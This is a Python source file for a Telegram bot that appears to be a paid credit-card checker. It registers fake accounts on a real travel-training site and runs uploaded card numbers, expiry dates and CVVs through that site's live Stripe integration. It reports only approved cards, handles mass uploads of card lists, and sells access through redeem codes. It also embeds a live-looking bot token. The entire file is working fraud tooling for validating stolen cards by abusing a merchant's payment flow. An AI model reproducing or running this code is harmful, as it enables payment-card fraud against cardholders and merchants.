from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import json
import re
import random
import string
import os
import time
import requests

# Bot configuration
TELEGRAM_TOKEN = "7348550676:AAF4VaQcfq36Hwj1kQJmsr8wGv20uNum4Go"
OWNER_ID = 5696226098

# Banner
xvzn_banner = """
 -- Coded By meow meow anuj
"""

# Generate random code
def generate_code(length=8):
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_email(length=9, domain=None):
    common_domains = ["gmail.com", "outlook.com", "proton.me", "yahoo.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_lowercase + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

# Session management
def create_session():
    try:
        session = requests.Session()
        email = generate_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']

        password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
        data = {
            'afurd_field_nonce': nonce,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': noncee,
            'register': 'Register',
        }
        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            return session
        return None
    except Exception as e:
        return None

def manage_session():
    session_file = "meowx-session.txt"
    if os.path.exists(session_file):
        with open(session_file, "r") as file:
            cookies = eval(file.read().strip())
            session = requests.Session()
            session.cookies.update(cookies)
            return session
    session = create_session()
    if session:
        with open(session_file, "w") as file:
            file.write(str(session.cookies.get_dict()))
    return session

# Load or initialize redeem codes and premium users
def load_redeem_codes():
    if os.path.exists("redeem_codes.json"):
        with open("redeem_codes.json", "r") as f:
            return json.load(f)
    return {}

def save_redeem_codes(codes):
    with open("redeem_codes.json", "w") as f:
        json.dump(codes, f)

def load_premium_users():
    if os.path.exists("premium_users.json"):
        with open("premium_users.json", "r") as f:
            return json.load(f)
    return {}

def save_premium_users(users):
    with open("premium_users.json", "w") as f:
        json.dump(users, f)

# Card checking logic (only sends approved cards)
async def check_credit_card(update: Update, context: ContextTypes.DEFAULT_TYPE, card, session):
    try:
        cc, mm, yy, cvv = card.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.json()

        if 'error' in res:
            return

        payment_method_id = res['id']

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.thetravelinstitute.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
        res = response.json()

        if res.get('success') == False:
            return
        else:
            await update.message.reply_text(f"> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ++++++++++++\n> {card} - Approved!")
    except Exception as e:
        return

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    if str(user_id) not in premium_users and user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only the owner or premium users can use this bot. Use /redeem [code] to get premium access.")
        return
    await update.message.reply_text(f"{xvzn_banner}\nWelcome! Use:\n/chk [card_details] - Check a single card\n/check - Upload a file for mass check\n(Owner only: /createcode [days] to generate a redeem code, /broadcast [message] to send to all premium users)")

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    if str(user_id) not in premium_users and user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Use /redeem [code] to get premium access.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /chk [card|mm|yy|cvv]\nExample: /chk 1234567890123456|12|25|123")
        return
    card = " ".join(context.args).replace('/', '|')
    session = manage_session()
    if session:
        await update.message.reply_text(f"Checking {card}...")
        await check_credit_card(update, context, card, session)
    else:
        await update.message.reply_text("Failed to establish a session.")

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    if str(user_id) not in premium_users and user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Use /redeem [code] to get premium access.")
        return
    context.user_data['mass_check'] = True
    await update.message.reply_text("Please upload a .txt file with cards (one per line, format: card|mm|yy|cvv).")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    if str(user_id) not in premium_users and user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Use /redeem [code] to get premium access.")
        return
    if not context.user_data.get('mass_check', False):
        await update.message.reply_text("Please use /check command first to upload a file.")
        return
    if update.message.document and update.message.document.file_name.endswith('.txt'):
        context.user_data['mass_check'] = False
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r') as f:
            cc_list = [line.strip() for line in f if line.strip()]
        os.remove(file_path)
        await update.message.reply_text(f"Loaded {len(cc_list)} cards. Processing (only approved cards will be sent)...")
        session = manage_session()
        if session:
            for card in cc_list:
                await check_credit_card(update, context, card, session)
                time.sleep(random.uniform(1.0, 2.5))
            await update.message.reply_text("Mass check completed! Only approved cards were sent.")
        else:
            await update.message.reply_text("Failed to establish a session.")
    else:
        await update.message.reply_text("Please upload a valid .txt file.")

async def createcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only the owner can create codes.")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /createcode [days]\nExample: /createcode 7")
        return
    days = int(context.args[0])
    if days <= 0:
        await update.message.reply_text("Days must be a positive number.")
        return
    code = generate_code()
    redeem_codes = load_redeem_codes()
    expiration = (datetime.now() + timedelta(days=days)).isoformat()
    redeem_codes[code] = expiration
    save_redeem_codes(redeem_codes)
    await update.message.reply_text(f"Created redeem code: {code}\nValid until: {expiration}")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem [code]\nExample: /redeem ABC12345")
        return
    code = context.args[0].upper()
    redeem_codes = load_redeem_codes()
    if code not in redeem_codes:
        await update.message.reply_text("Invalid or expired code.")
        return
    expiration = datetime.fromisoformat(redeem_codes[code])
    if datetime.now() > expiration:
        del redeem_codes[code]
        save_redeem_codes(redeem_codes)
        await update.message.reply_text("Code has expired.")
        return
    premium_users = load_premium_users()
    premium_users[str(user_id)] = expiration.isoformat()
    save_premium_users(premium_users)
    await update.message.reply_text(f"Code redeemed successfully! You have premium access until {expiration}.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only the owner can broadcast messages.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast [message]\nExample: /broadcast Hello premium users!")
        return
    message = " ".join(context.args)
    premium_users = load_premium_users()
    current_time = datetime.now()
    successful = 0
    failed = 0

    for user_id_str, expiration in premium_users.items():
        if datetime.fromisoformat(expiration) > current_time:
            try:
                await context.bot.send_message(chat_id=int(user_id_str), text=message)
                successful += 1
            except Exception as e:
                failed += 1
                print(f"Failed to send to {user_id_str}: {e}")

    await update.message.reply_text(f"Broadcast sent! Successfully reached {successful} users. Failed to reach {failed} users.")

# Bot setup
def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("check", check))
    app.add_handler(CommandHandler("createcode", createcode))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()